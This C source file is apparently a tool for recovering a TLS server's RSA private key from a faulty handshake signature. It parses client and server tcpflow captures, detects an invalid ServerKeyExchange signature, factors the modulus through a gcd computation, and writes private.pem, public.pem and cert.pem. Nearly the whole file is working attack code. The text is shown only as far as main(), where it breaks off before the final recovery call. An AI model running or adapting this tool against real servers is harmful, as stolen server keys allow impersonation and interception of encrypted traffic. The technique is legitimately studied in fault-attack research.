#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <net/if.h>


#include <openssl/ssl.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <openssl/pem.h>
#include <openssl/conf.h>
#include <openssl/x509.h>
#include <openssl/buffer.h>
#include <openssl/x509v3.h>
#include <openssl/opensslconf.h>


#define CLIENT_HELLO_MESSAGE            0x01
#define SERVER_HELLO_MESSAGE            0x02
#define CERTIFICATE_MESSAGE             0x0b
#define SERVER_KEY_EXCHANGE_MESSAGE     0x0c

#define TLS_HANDSHAKE                   0x16
#define TLS_HALF_WORD_VERSION           0x03

#define SZ_HANDSHAKE_LAYER      5

int verbose = 1;
int use_tls12 = 0;

unsigned char client_random[32];
unsigned char server_random[32];
unsigned char *server_certificate = NULL;
short cert_len = 0;
unsigned char *server_param = NULL;
short server_param_len = 0;
unsigned char *signature = NULL;
short signature_len = 0;
unsigned char sig_hash_alg;
unsigned char right_signature[EVP_MAX_MD_SIZE * 2];

unsigned char *enc_type = NULL;
unsigned int enc_len = 0;
const unsigned char sha1_der_encoded[] = "\x30\x21\x30\x09\x06\x05\x2b\x0e\x03\x02\x1a\x05\x00\x04\x14";
const unsigned char sha224_der_encoded[] = "\x30\x29\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x04\x05\x00\x04\x18";
const unsigned char sha256_der_encoded[] = "\x30\x31\x30\x0D\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x01\x05\x00\x04\x20";
const unsigned char sha384_der_encoded[] = "\x30\x41\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x02\x05\x00\x04\x30";
const unsigned char sha512_der_encoded[] = "\x30\x51\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x03\x05\x00\x04\x40";

static void print_hex(const char *string, const unsigned char *blob, int len)
{
   int i = 0;

   printf("%s", string);
   for (i; i < len; i++)
      printf("%02X", blob[i]);

   printf("\n");
}

int encrypt_decrypt_test()
{
   BIO *private_key = BIO_new(BIO_s_file());
   //BIO *public_key = BIO_new(BIO_s_file());
   BIO *cert = BIO_new(BIO_s_file());
   X509 *x = NULL;
   EVP_PKEY *pkey=NULL;
   RSA *priv_key = NULL;
   RSA *pub_key = NULL;
   int len1, len2;
   unsigned char to_encrypt[] = "ENCS\0";
   unsigned char encrypted[4098]={};
   unsigned char decrypted[4098]={};

   if (!BIO_read_filename(private_key, "./private.pem"))
   {
        printf("   Error reading PEM RSA Private Key File\n");
        return 0;
   }

   pkey = PEM_read_bio_PrivateKey(private_key, NULL, NULL, NULL);
   if (!pkey)
   {
        printf("   Error parsing Private Key\n");
        return 0;
   }
   BIO_free_all(private_key);

   priv_key = EVP_PKEY_get1_RSA(pkey);
   EVP_PKEY_free(pkey);
   if (!priv_key)
   {
        printf("   Error getting Private Key\n");
        return 0;
   }

   len1 = RSA_private_encrypt(5, to_encrypt, encrypted, priv_key, RSA_PKCS1_PADDING);
   if (len1 == -1)
   {
      printf("   Error encrypting test message\n");
      return 0;
   }
   RSA_free(priv_key);

   if (verbose)
      printf("   Encrypted payload of len: %d bytes\n", len1);

   //if (!BIO_read_filename(public_key, "./public.pem"))
   if (!BIO_read_filename(cert, "./cert.pem"))
   {
        printf("   Error reading PEM Cert File\n");
        return 0;
   }

   x = PEM_read_bio_X509_AUX(cert, NULL, NULL, NULL);
   if (x == NULL)
   {
        printf("   Unable to load certificate\n");
        return 0;
   }
   BIO_free(cert);

   pkey = X509_get_pubkey(x);
   X509_free(x);

   //pkey = PEM_read_bio_PUBKEY(public_key, NULL, NULL, NULL);
   if (!pkey)
   {
        printf("   Error parsing Pub Key from Certificate File\n");
        return 0;
   }
   //BIO_free_all(public_key);
   pub_key = EVP_PKEY_get1_RSA(pkey);
   EVP_PKEY_free(pkey);
   if (!pub_key)
   {
        printf("   Error getting Public Key\n");
        return 0;
   }

   len2 = RSA_public_decrypt(len1, encrypted, decrypted, pub_key, RSA_PKCS1_PADDING);
   if (len2 == -1)
   {
      printf("   Error decrypting test message\n");
      return 0;
   }
   RSA_free(pub_key);

   if (verbose)
   {
      printf("   Decrypted payload of len: %d bytes\n", len2);
      printf("   Decrypted payload: %s\n", decrypted);
   }

   if (!strncmp(decrypted, "ENCS", 4))
   {
      return 1;
   }
   else
      return 0;
}

const EVP_MD *tls12_get_hash(unsigned char hash_alg)
{
   switch(hash_alg)
   {
      case TLSEXT_hash_sha1:
         enc_type = (unsigned char *)sha1_der_encoded;
         enc_len = 15;
         return EVP_sha1();
      case TLSEXT_hash_sha224:
         enc_type = (unsigned char *)sha224_der_encoded;
         enc_len = 19;
         return EVP_sha224();
      case TLSEXT_hash_sha256:
         enc_type = (unsigned char *)sha256_der_encoded;
         enc_len = 19;
         return EVP_sha256();
      case TLSEXT_hash_sha384:
         enc_type = (unsigned char *)sha384_der_encoded;
         enc_len = 19;
         return EVP_sha384();
      case TLSEXT_hash_sha512:
         enc_type = (unsigned char *)sha512_der_encoded;
         enc_len = 19;
         return EVP_sha512();
      default:
         return NULL;
   }
}

int generate_priv_key(BIGNUM *n_prime, BIGNUM *second_prime, RSA *rsa_key, BN_CTX *_ctx)
{
   BIGNUM *r0, *r1, *r2, *d;
   BIO *bp_public = NULL, *bp_private = NULL;
   RSA *r = NULL;
   RSA *priv_key = NULL;
   int i, ret = 1;

   if (verbose)
      printf("   DERIVING THE PRIVATE KEY\n");

   r0 = BN_new();
   r1 = BN_new();
   r2 = BN_new();
   d = BN_new();

   BN_sub(r1,n_prime,BN_value_one());
   BN_sub(r2,second_prime,BN_value_one());
   BN_mul(r0,r1,r2,_ctx);
   BN_mod_inverse(d,rsa_key->e,r0,_ctx);

   if (verbose)
   {
      printf("   SIR AND MADAM, THE PRIVATE KEY is:\n\t %s\n\n", BN_bn2hex(d));
      printf("   NOW WE ARE GOING TO GENERATE PUBLIC AND PRIVATE KEY FILES\n");
   }

   r = RSA_new();
   r->n=BN_new();
   r->d=BN_new();
   r->e=BN_new();
   r->p=BN_new();
   r->q=BN_new();
   r->dmp1=BN_new();
   r->dmq1=BN_new();
   r->iqmp=BN_new();

   BN_copy(r->e, rsa_key->e);
   BN_copy(r->n, rsa_key->n);
   BN_copy(r->p, n_prime);
   BN_copy(r->q, second_prime);
   BN_copy(r->d, d);

   /* calculate d mod (p-1) */
   BN_mod(r->dmp1,d,r1,_ctx);

   /* calculate d mod (q-1) */
   BN_mod(r->dmq1,d,r2,_ctx);

   /* calculate inverse of q mod p */
   BN_mod_inverse(r->iqmp,r->q,r->p,_ctx);

   // save private key
   bp_private = BIO_new_file("private.pem", "w+");
   i = PEM_write_bio_RSAPrivateKey(bp_private, r, NULL, NULL, 0, NULL, NULL);
   if(i != 1)
   {
      if (verbose)
         printf("   Failed to create private key file\n");

      ret = 0;
      goto _free;
   }
   BIO_free_all(bp_private);

   bp_private = BIO_new(BIO_s_file());
   if (!BIO_read_filename(bp_private, "./private.pem"))
   {
      if (verbose)
         printf("   Error reading PEM RSA Private Key File\n");

      ret = 0;
      goto _free;
   }

   EVP_PKEY *pkey = PEM_read_bio_PrivateKey(bp_private, NULL, NULL, NULL);
   if (!pkey)
   {
      if (verbose)
         printf("   Error parsing Private Key\n");

      ret = 0;
      goto _free;
   }
   BIO_free_all(bp_private);

   priv_key = EVP_PKEY_get1_RSA(pkey);
   EVP_PKEY_free(pkey);
   if (!priv_key)
   {
      if (verbose)
         printf("   Error getting Private Key\n");

      ret = 0;
      goto _free;
   }

   // save public key
   bp_public = BIO_new_file("public.pem", "w+");
   i = PEM_write_bio_RSA_PUBKEY(bp_public,priv_key);
   RSA_free(priv_key);
   if(i != 1)
   {
      if (verbose)
         printf("   Failed to create public key file\n");

      ret = 0;
      goto _free;
   }
   BIO_free_all(bp_public);

   //system("openssl rsa -in private.pem -pubout > public.pem");

   /* double check if private key and public key are related to each other
      by encrypting and decrypting a value */

   if (!encrypt_decrypt_test())
   {
      if (verbose)
         printf("   private and public keys generated but unrelated\n");

      unlink("./private.pem");
      unlink("./public.pem");
      unlink("./cert.pem");

     ret = 0;
   }

_free:
   RSA_free(r);
   BN_free(r0);
   BN_free(r1);
   BN_free(r2);
   BN_free(d);

   return ret;
}

int generate_keys(BIGNUM *x, BIGNUM *y, RSA *rsa_key)
{
   BIGNUM *y_e, *o1, *n_prime;
   BN_CTX *_ctx = NULL;
   int ret = 1;

   if ((_ctx = BN_CTX_new()) == NULL)
   {
      if (verbose)
         printf("   BN_CTX_new error\n");

      return 0;
   }

   /* calculate a prime of n */
   y_e = BN_new();
   o1 = BN_new();
   n_prime = BN_new();

   // y_e = y^e
   BN_mod_exp(y_e, y, rsa_key->e, rsa_key->n, _ctx);
   if (verbose)
   {
      printf("   RSA->e = %s:%s\n\n", BN_bn2dec(rsa_key->e), BN_bn2hex(rsa_key->e));
      printf("   y ^ e = %s\n\n", BN_bn2hex(y_e));
      printf("   y ^ e calculated\n\n\n");
   }

   // o1 = y^e - x
   BN_sub(o1, y_e, x);
   if (verbose)
   {
      printf("   y^e - x = %s\n\n", BN_bn2hex(o1));
      printf("   y^2 - x calculated\n\n\n");
   }

   // n_prime = gcd(o1, n);
   BN_gcd(n_prime, o1, rsa_key->n, _ctx);
   if (verbose)
   {
      printf("RSA->n = %s\n\n", BN_bn2hex(rsa_key->n));
      printf("   N prime derived: %s\n", BN_bn2hex(n_prime));
   }

   /* calculate the other prime of n */
   BIGNUM *second_prime = BN_new();
   BN_div(second_prime, o1, rsa_key->n, n_prime, _ctx);
   if (verbose)
      printf("   second prime = %s\n\n", BN_bn2hex(second_prime));

   /* now we can generate the private key */
   if (!generate_priv_key(n_prime, second_prime, rsa_key, _ctx))
      ret = 0;

   BN_free(y_e);
   BN_free(o1);
   BN_free(n_prime);
   BN_CTX_free(_ctx);

   return ret;
}

int RSA_padding_add_PKCS1_tls_12(unsigned char *to, int tlen, const unsigned char *from, int flen)
{
   int j;
   unsigned char *p;

   if (flen > (tlen-RSA_PKCS1_PADDING_SIZE))
   {
      fprintf(stderr, "\t[ERROR]: Padding TLS1.2 Data Too Large for Key Size\n");
      return(0);
   }

   p=(unsigned char *)to;

   *(p++)=0;
   *(p++)=1;

   /* pad out with 0xff data */
   j=tlen-3-flen-enc_len;
   memset(p,0xff,j);
   p+=j;
   *(p++)='\0';
   memcpy(p, enc_type, enc_len);
   p+=enc_len;
   memcpy(p, from, (unsigned int)flen);

   return(1);
}

int store_Y(unsigned char *param, int n, BIGNUM *y)
{
   if (BN_bin2bn(param, n, y) == NULL)
   {
      if (verbose)
         printf("   Error to convert the faulty signature in a bignum\n");

      return 0;
   }

   if (verbose)
      printf("   Faulty Signature Payload: %s\n", BN_bn2hex(y));

   return 1;
}

int store_X(RSA *rsa_key, unsigned char *md_buf, int j, BIGNUM *x)
{
   unsigned char *pad_buf = NULL;
   int num = 0;
   int i;

   num = BN_num_bytes(rsa_key->n);
   pad_buf = OPENSSL_malloc(num);

   if (use_tls12)
      i = RSA_padding_add_PKCS1_tls_12(pad_buf, num, md_buf, j);
   else
      i = RSA_padding_add_PKCS1_type_1(pad_buf, num, md_buf, j);

   if (i != 1)
   {
      if (verbose)
         printf("   ERROR ON GENERATING PADDING OF X\n");

      return 0;
   }

   if (verbose)
   {
      printf("   Padding generated of length %d\n", num);
      print_hex("   Padding Payload: ", pad_buf, num);
   }

   if (BN_bin2bn(pad_buf, num, x) == NULL)
   {
      if (verbose)
         printf("   Error to convert padding in a bignum\n");

      return 0;
   }

   if (verbose)
      printf("   Padding Converted Payload: %s\n", BN_bn2hex(x));

   OPENSSL_free(pad_buf);
   return 1;
}

int calculate_right_signature_tls_12(unsigned char *c, int param_len, unsigned char *md_buf, const EVP_MD *md)
{
   unsigned int size = 0;
   unsigned char *q; 
   EVP_MD_CTX ctx;

   EVP_MD_CTX_init(&ctx);
   q = md_buf;

   EVP_DigestInit_ex(&ctx, md, NULL);
   EVP_DigestUpdate(&ctx, &(client_random[0]), SSL3_RANDOM_SIZE);
   EVP_DigestUpdate(&ctx, &(server_random[0]), SSL3_RANDOM_SIZE);
   EVP_DigestUpdate(&ctx, c, param_len);
   EVP_DigestFinal_ex(&ctx, q, &size);

   if (verbose)
   {
      printf("   Message Digest final size: %d\n", size);
      print_hex("   Digest: ", md_buf, size);
   }

   EVP_MD_CTX_cleanup(&ctx);
   return size;
}

int calculate_right_signature(unsigned char *c, int param_len, unsigned char *md_buf)
{
   int num, j;
   unsigned int size;
   unsigned char *q; // md_buf[EVP_MAX_MD_SIZE * 2];
   EVP_MD_CTX ctx;

   EVP_MD_CTX_init(&ctx);

   j = 0;
   q = md_buf;

   for (num = 2; num > 0; num--)
   {
      EVP_DigestInit_ex(&ctx, (num == 2)
                ? EVP_md5() : EVP_sha1(), NULL);
      EVP_DigestUpdate(&ctx, &(client_random[0]),
                SSL3_RANDOM_SIZE);
      EVP_DigestUpdate(&ctx, &(server_random[0]),
                SSL3_RANDOM_SIZE);
      EVP_DigestUpdate(&ctx, c, param_len);
      EVP_DigestFinal_ex(&ctx, q, &size);
      q += size;
      j += size;
      if (verbose)
         printf((num == 2) ? "   MD5 Digest Size: %d\n" : "   SHA1 Digest Size: %d\n", size);
   }
   if (verbose)
   {
      printf("   Message Digest final size: %d\n", j);
      print_hex("   Right Signature Calculated: ", md_buf, 36);
   }

   EVP_MD_CTX_cleanup(&ctx);
   return j;
}

int recover_private_key(char *file1, char *file2)
{
   int ret = 0, error = 0;
   int j, i;
   X509 *cert = NULL;
   EVP_PKEY *pkey = NULL;
   BIGNUM *x = NULL;
   BIGNUM *y = NULL;
   unsigned char *p = server_certificate;
   char random_dir[16];

   /* Calculate offline the right signature at least according to the parameters we have collected */
   if (!use_tls12)
      j = calculate_right_signature(server_param, server_param_len, (unsigned char *)&right_signature);
   
   /* Time to parse the certificate for getting the public key */
   if (verbose)
      printf("   Certificate len is %d\n", cert_len);
   cert = d2i_X509(NULL, &p, cert_len);
   if (cert == NULL)
   {
      fprintf(stderr, "\tFailed to parse the certificate\n");
      return ret;
   }

   /* Verify the signature type by extracting the public key from the certificate */
   int pubkey_algonid = OBJ_obj2nid(cert->cert_info->key->algor->algorithm);
   if (pubkey_algonid != NID_rsaEncryption)
   {
      X509_free(cert);
      fprintf(stderr, "\tPubkey algonid is not RSA\n");
      return ret;
   }
  
   /* Getting n and e */ 
   pkey = X509_get_pubkey(cert);
   RSA *rsa_key = pkey->pkey.rsa;
   if (rsa_key == NULL)
   {
      //if (verbose)
      X509_free(cert);
      fprintf(stderr, "\tunable to extract RSA public key\n");
      return ret;
   }         
   if (verbose)
   {
      printf("   RSA->n = %s\n", BN_bn2hex(rsa_key->n));
      printf("   RSA->e = %s:%s\n", BN_bn2dec(rsa_key->e), BN_bn2hex(rsa_key->e));
   }

   if (use_tls12)
   {
      const EVP_MD *md = NULL;
      md = tls12_get_hash(sig_hash_alg);
      if (md == NULL)
      {
         fprintf(stderr, "\t[ERROR]: TLSv1.2 Unrecognized Hashing Algorithm!!!\r\n");
         error=1;
         goto _free;
      }

      /* Calculate offline and Verify the signature */
      j = calculate_right_signature_tls_12(server_param, server_param_len, (unsigned char *)&right_signature, md);

      EVP_MD_CTX md_ctx;
      EVP_MD_CTX_init(&md_ctx);
      EVP_VerifyInit_ex(&md_ctx, md, NULL);
      EVP_VerifyUpdate(&md_ctx, &(client_random[0]), SSL3_RANDOM_SIZE);
      EVP_VerifyUpdate(&md_ctx, &(server_random[0]), SSL3_RANDOM_SIZE);
      EVP_VerifyUpdate(&md_ctx, server_param, server_param_len);
      i = EVP_VerifyFinal(&md_ctx, signature, (int)signature_len, pkey);

      EVP_MD_CTX_cleanup(&md_ctx);
   }
   else 
   {
      /* Signature calculation for TLS <= 1.2 */ 
      i = RSA_verify(NID_md5_sha1, right_signature, j, signature, signature_len, pkey->pkey.rsa);
   }

   if (i == 1)
   {
      fprintf(stderr, "\tSignature is unfortunately valid ...\n");
      error=1;
      goto _free;
   }
   printf("SIGNATURE ERROR!!!\nThere is a failure on the signature. Let's try to recover the private key...\n");
  
   x = BN_new(); //x is the known plaintext
   if (!store_X(rsa_key, right_signature, j, x))
   {
      fprintf(stderr, "\tunable to populate X\n");
      error=1;
      goto _free;
   }

   y = BN_new(); //y is the faulty signature
   if (!store_Y(signature, signature_len, y))
   {
      fprintf(stderr, "\tunable to populate Y\n");
      error=1;
      goto _free;
   }

   mkdir("./results", 0700);
   chdir("./results");
   /* quick and dirty: we need a random string */
   memset(&random_dir, '\0', 16);
   random_dir[0] = '.';
   random_dir[1] = '/';
   int k = 2;
   for (i = 0; i <= 5; i++)
   {
      sprintf(&random_dir[k], "%02x", client_random[i+4]);
      k+=2;
   }
   if (verbose)
      printf("Random dir is %s\n", random_dir); 
   mkdir(random_dir, 0700);
   chdir(random_dir);

   /* save the certificate only if the keys have been generated correctly */
   BIO *bp_cert = NULL;
   bp_cert = BIO_new_file("cert.pem", "w+");
   i = PEM_write_bio_X509(bp_cert, cert);
   if(i != 1)
   {
      fprintf(stderr, "\tFailed to create cert key file\n");
      error=1;
      goto _free;
   }
   BIO_free_all(bp_cert);

   /* We have now all we need for trying to generate the private key. */
   if (!generate_keys(x, y, rsa_key))
   {
      fprintf(stderr, "\terror with keys generation\n");
      error=1;
      goto _free;
   }

   printf("SUCCESS!!! You can find private.pem, public.pem and cert.pem here: ./results%s:\n", random_dir);
   system("ls -l *.pem");
  
   /* copy the stream files inside the same directory along with the key files */
   
   char path[PATH_MAX];
   memset(&path, '\0', PATH_MAX);
   snprintf(path, PATH_MAX, "../../%s", file1); 
   if (verbose)
   {
      printf("   file1 is %s\n   file2 is %s\n", file1, file2);
      printf("   path1 is %s\n", path);
   }
   pid_t pid = fork();
   
   if (pid == 0)
      execl("/bin/cp", "/bin/cp", path, ".", (char *)0);
  
   memset(&path, '\0', PATH_MAX);
   snprintf(path, PATH_MAX, "../../%s", file2);
   if (verbose)
      printf("\tpath2 is %s\n", path);

   pid = fork();

   if (pid == 0)  
      execl("/bin/cp", "/bin/cp", path, ".", (char *)0);

   _free:
      EVP_PKEY_free(pkey);
      X509_free(cert);

      if (x)
         BN_free(x);

      if (y)
         BN_free(y);

      if (error)
      {
         unlink("cert.pem");
         chdir("..");
         rmdir(random_dir);
         return ret;
      }
      
      return ret = 1;  
}

int parse_server_stream(FILE *fp, long size)
{
   int ret = 0;
   int field1, field2;
   short len = 0, counter = 0;
   short ecc_param_len = 0, temp_len = 0;

   if (verbose)
      printf("   Original stream size: %d\n", size);
   
   if (size < SZ_HANDSHAKE_LAYER)
   {
      fprintf(stderr, "\tRecord Layer too small\n");
      return ret;
   }

   field1 = fgetc(fp);
   field2 = fgetc(fp);
   /* is this a real TLS session? */
   if (field1 != TLS_HANDSHAKE || field2 != TLS_HALF_WORD_VERSION)
   {
      fprintf(stderr, "\tNot a TLS message\n");
      return ret;
   }
   if (verbose)
      printf("   field1 = 0x%x field2 = 0x%x\n", field1, field2);

   field1 = fgetc(fp); //useless
   fread(&len, 1, 2, fp);
   len = ntohs(len);
   if (verbose)
      printf("   TLS packet len: %d\n", len);
   counter+=len + 5;

   if (size < len)
   {
      fprintf(stderr, "\tFile does not contain the whole data\n");
      return ret;
   }
   size-=SZ_HANDSHAKE_LAYER;
   if (verbose)
      printf("   Remaining stream size: %d\n", size);

   field1 = fgetc(fp);
   /* This should be a Server Hello Message */
   if (field1 != SERVER_HELLO_MESSAGE)
   {
      fprintf(stderr, "\tExpected Server Hello, instead found %x\n", field1);
      return ret;
   }

   /* Jump to the Random structure */
   fseek(fp, 5L, SEEK_CUR);
   fread(&server_random[0], 1, 32, fp);
   if (verbose)
   {
      print_hex("   Server Hello Random: ", server_random, 32);
      printf("   Finished to parse Server Hello\n");
   }
   
   /* Jump to the Certificate Message */
   size-=len;
   len = len - 38;
   if (verbose)
   {
      printf("   Remaining stream size: %d\n", size);
      printf("   TLS Certificate should be at offset %d\n", len+5);
   }
   fseek(fp, len, SEEK_CUR);

   field1 = fgetc(fp);
   field2 = fgetc(fp);
   if (field1 != TLS_HANDSHAKE || field2 != TLS_HALF_WORD_VERSION)
   {
      fprintf(stderr, "\tApparently not a TLS Header\n");
      return ret;
   }

   field1 = fgetc(fp); //useless
   fread(&len, 1, 2, fp);
   len = ntohs(len);
   if (verbose)
      printf("   Certificate message len: %d\n", len);
   counter+=len + 5;

   if (size < len)
   {
      fprintf(stderr, "\tFile does not contain the whole data for Certificate Message\n");
      return ret;
   }
   size-=SZ_HANDSHAKE_LAYER;
   if (verbose)
      printf("   Remaining stream size: %d\n", size);

   field1 = fgetc(fp);
   /* This should be a Certificate Hello Message */
   if (field1 != CERTIFICATE_MESSAGE)
   {
      fprintf(stderr, "\tExpected Certificate Message, instead found %x\n", field1);
      return ret;
   }

   fseek(fp, 7L, SEEK_CUR);
   fread(&cert_len, 1, 2, fp);

   cert_len = ntohs(cert_len);
   if (verbose)
      printf("   Certificate len is %d\n", cert_len);
  
   if (size < cert_len)
   {
      fprintf(stderr, "\tFile does not contain the whole Certificate blob\n");
      return ret;
   }

   server_certificate = (char *)malloc(cert_len);
   fread(server_certificate, 1, cert_len, fp);
   if (verbose)
   {
      print_hex("   Server Certificate: ", server_certificate, cert_len);
      printf("   Finished to parse Server Hello\n");
   }
   //mkdir("tmp");
   //FILE *cert = fopen("./tmp/cert.crt", "w");
   //fwrite(server_certificate, 1, cert_len, cert);
   //fclose(cert);

   //free(server_certificate);

   /* Jump to the Server Key Exchange Message */
   size-=len;
   len = len - 10 - cert_len;
   if (verbose) 
   {
      printf("   Remaining stream size: %d\n", size);
      printf("   TLS Server Key Exchange should be at offset %d\n", len+5);
   }
   fseek(fp, len, SEEK_CUR);

   field1 = fgetc(fp);
   field2 = fgetc(fp);
   if (field1 != TLS_HANDSHAKE || field2 != TLS_HALF_WORD_VERSION)
   {
      fprintf(stderr, "\tApparently not a TLS Header\n");
      return ret;
   }

   field1 = fgetc(fp); //useless
   fread(&len, 1, 2, fp);
   len = ntohs(len);
   if (verbose)
      printf("   Server Key Exchange message len: %d\n", len);

   if (size < len)
   {
      fprintf(stderr, "\tFile does not contain the whole data for Server Key Exchange Message\n");
      return ret;
   }
   size-=SZ_HANDSHAKE_LAYER;
   if (verbose)
      printf("   Remaining stream size: %d\n", size);

   field1 = fgetc(fp);
   /* This should be a Certificate Hello Message */
   if (field1 != SERVER_KEY_EXCHANGE_MESSAGE)
   {
      fprintf(stderr, "\tExpected Server Key Exchange Message, instead found %x\n", field1);
      return ret;
   }

   fseek(fp, 3L, SEEK_CUR);
   size-=3;
   counter+=9;
   if (use_tls12)
   {
      /* We are using TLS < 1.2. Server_param is:
        curve_type
        named_curve
        pubkey_length
        pubkey
      */
      if (verbose)
         printf("   TLS 1.2 is USED\n");

      // skip curve_type and named_curve
      fseek(fp, 3L, SEEK_CUR);
      size-=3;
      ecc_param_len+=3;

      temp_len = htons(fgetc(fp)); // p len
      temp_len >>=  8;
      if (verbose)
         printf("   P len: %d\n", temp_len);

      if (size < temp_len)
      {
         fprintf(stderr, "\tP len is too big. Stream file truncated or corrupted\n");
         return ret;
      }
      ecc_param_len+=temp_len + 1;
      if (verbose)
      {
         printf("   ECC_Server_param struct is %d bytes\n", ecc_param_len);
         printf("   Offset from starting of file %d\n", counter);
      }
      fseek(fp, counter, SEEK_SET);

      /* time to copy the server_param structure */
      server_param = (char *)malloc(ecc_param_len);
      fread(server_param, 1, ecc_param_len, fp);
      if (verbose)
         print_hex("   Server Param Structure: ", server_param, ecc_param_len);

      server_param_len=ecc_param_len;

      /* SIGNATURE HASH ALGORITHM */
      sig_hash_alg = fgetc(fp);
      field1 = fgetc(fp); // useless
      if (verbose)
         printf("   Signature hash algorithm: %x\n", sig_hash_alg);
      size-=2;

      /* SIGNATURE */
      fread(&temp_len, 1, 2, fp);
      temp_len = ntohs(temp_len);
      signature_len = temp_len;
      if (verbose)
         printf("   Signature len: %d\n", signature_len);
      size-=2;

      if (size < temp_len)
      {
         fprintf(stderr, "\tSignature len is too big. Stream file truncated or corrupted\n");
         return ret;
      }
      signature = (char *)malloc(temp_len);
      fread(signature, 1, signature_len, fp);
      if (verbose)
         print_hex("   Signature: ", signature, signature_len);
   }
   else
   {
      /* We are using TLS < 1.2. Server_param is:
        p_length
        p
        g_length
        g
        pubkey_length
        pubkey
      */
   
      if (verbose)
         printf("   TLS < 1.2 is USED\n");

      fread(&temp_len, 1, 2, fp);
      temp_len=ntohs(temp_len);
      if (verbose)
         printf("   P len: %d\n", temp_len);
      size-=2;
      server_param_len+=temp_len + 2;

      if (size < temp_len)
      {
         fprintf(stderr, "\tP len is too big. Stream file truncated or corrupted\n");
         return ret;
      }

      fseek(fp, temp_len, SEEK_CUR);
      size-=temp_len;

      fread(&temp_len, 1, 2, fp);
      temp_len = ntohs(temp_len);
      if (verbose)
         printf("   G len: %d\n", temp_len);
      size-=2;
      server_param_len+=temp_len + 2;

      if (size < temp_len)
      {
         fprintf(stderr, "\tG len is too big. Stream file truncated or corrupted\n");
         return ret;
      }
      fseek(fp, temp_len, SEEK_CUR);
      size-=temp_len;

      fread(&temp_len, 1, 2, fp);
      temp_len = ntohs(temp_len);
      if (verbose)
         printf("   PubKey len: %d\n", temp_len);
      size-=2;
      server_param_len+=temp_len + 2;

      if (size < temp_len)
      {
         fprintf(stderr, "\tPubKey len is too big. Stream file truncated or corrupted\n");
         return ret;
      }
      size-=temp_len;

      if (verbose)
      {
         printf("   Server_param struct is %d bytes\n", server_param_len);
         printf("   Offset from starting of file %d\n", counter);
      }
      fseek(fp, counter, SEEK_SET);

      /* time to copy the server_param structure */
      server_param = (char *)malloc(server_param_len);
      fread(server_param, 1, server_param_len, fp);
      if (verbose)
         print_hex("   Server Param Structure: ", server_param, server_param_len);

      /* SIGNATURE */
      fread(&temp_len, 1, 2, fp);
      temp_len = ntohs(temp_len);
      signature_len = temp_len;
      if (verbose)
         printf("   Signature len: %d\n", signature_len);
      size-=2;

      if (size < signature_len)
      {
         fprintf(stderr, "\tSignature len is too big. Stream file truncated or corrupted\n");
         return ret;
      }
      signature = (char *)malloc(temp_len);
      fread(signature, 1, signature_len, fp);
      if (verbose)
         print_hex("   Signature: ", signature, signature_len);
   }

   return ret = 1;
}

int parse_client_stream(FILE *fp, long size)
{
   int ret = 0;
   int field1, field2;
   short len;

   if (verbose)
      printf("   Original stream size: %d\n", size);
   
   if (size < SZ_HANDSHAKE_LAYER)
   {
      fprintf(stderr, "\tRecord Layer too small\n");
      return ret;
   }

   field1 = fgetc(fp);
   field2 = fgetc(fp);
   /* is this a real TLS session? */
   if (field1 != TLS_HANDSHAKE || field2 != TLS_HALF_WORD_VERSION)
   {
      fprintf(stderr, "\tNot a TLS message\n");
      return ret;
   }
  
   if (verbose)
      printf("   field1 = 0x%x field2 = 0x%x\n", field1, field2);

   field1 = fgetc(fp); //useless
   fread(&len, 1, 2, fp);
   if (verbose)
      printf("   TLS packet len: %d\n", ntohs(len));

   if (size < ntohs(len))
   {
      fprintf(stderr, "\tFile does not contain the whole data\n");
      return ret;
   }
   size-=SZ_HANDSHAKE_LAYER;
   if (verbose)
      printf("   Remaining stream size: %d\n", size);

   field1 = fgetc(fp);
   /* is this a Client Hello Message? */
   if (field1 != CLIENT_HELLO_MESSAGE)
   {
      fprintf(stderr, "\tNot a TLS Client Hello message\n");
      return ret;
   }

   /* is TLSv1.2 used ? */
   fseek(fp, 3L, SEEK_CUR);
   field1 = fgetc(fp);
   field2 = fgetc(fp);
   if (verbose)
      printf("   field1 = 0x%x field2 = 0x%x\n", field1, field2);
   if (field1 == 0x03 && field2 == 0x03)
      use_tls12 = 1;

   if (verbose)
   {
      if (use_tls12)
         printf("   This is a TLSv1.2 session...\n");
      else
         printf("   This is a < TLSv1.2 session...\n");
   }
   /* now it's time to extract the Random struct */
   fread(&client_random[0], 1, 32, fp);
   if (verbose)
      print_hex("   Client Hello Random: ", client_random, 32);

   return ret = 1;
}

int main(int argc, char *argv[])
{
   FILE *fp1, *fp2;
   long size1, size2;

   if (argc < 3)
   {
      fprintf(stderr, "Usage: %s <client_tcpflow_file> <server_tcpflow_file>\n", argv[0]);
      exit(0);
   }

   /* Let's start analyzing the client data stream */

   fp1 = fopen(argv[1], "r");
   if (fp1 == NULL)
   {
      fprintf(stderr, "Error to open %s\n", argv[1]);
      exit(0);
   }

   fseek(fp1, 0L, SEEK_END);
   size1 = ftell(fp1);

   if (!size1)
   {
      fclose(fp1);
      fprintf(stderr, "File %s is empty\n", argv[1]);
      exit(0);
   }
   printf("Processing %s...\n", argv[1]);
   printf("   File is %d bytes\n", size1);

   //fseek(fp, 0L, SEEK_SET);
   rewind(fp1);

   /* Parse the client stream */
   if (!parse_client_stream(fp1, size1))
   {
      fclose(fp1);
      fprintf(stderr, "\tError while reading %s\n", argv[1]);
      exit(0);
   }
   fclose(fp1);

   /* Now let's analyze the server data stream  */
   fp2 = fopen(argv[2], "r");
   if (fp2 == NULL)
   {
      fprintf(stderr, "\tError to open %s\n", argv[2]);
      exit(0);
   }

   fseek(fp2, 0L, SEEK_END);
   size2 = ftell(fp2);

   if (!size2)
   {
      fclose(fp2);
      fprintf(stderr, "\tFile %s is empty\n", argv[2]);
      exit(0);
   }
   printf("Processing %s...\n", argv[2]);
   printf("   File is %d bytes\n", size2);

   rewind(fp2);

   /* Parse the client stream */
   if (!parse_server_stream(fp2, size2))
   {
      fclose(fp1);
      fprintf(stderr, "\tError while reading %s\n", argv[2]);
      exit(0);
   }
   fclose(fp2);

   /* Now we have all needed to attempt the recovery of the private key*/

